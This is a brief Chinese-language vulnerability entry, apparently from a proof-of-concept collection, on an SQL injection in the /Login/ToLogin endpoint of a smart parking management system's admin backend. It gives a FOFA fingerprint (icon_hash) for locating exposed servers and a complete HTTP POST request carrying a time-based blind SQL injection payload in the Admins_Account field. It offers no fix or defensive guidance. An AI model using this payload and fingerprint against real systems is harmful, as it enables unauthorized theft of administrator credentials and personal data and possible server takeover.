# 智能停车管理系统ToLogin存在SQL注入漏洞

停车场后台管理系统 ToLogin 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用&nbsp;SQL&nbsp;注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```yaml
icon_hash="938984120"
```

## poc

```java
POST /Login/ToLogin HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(5)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd=
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408162052998.png)
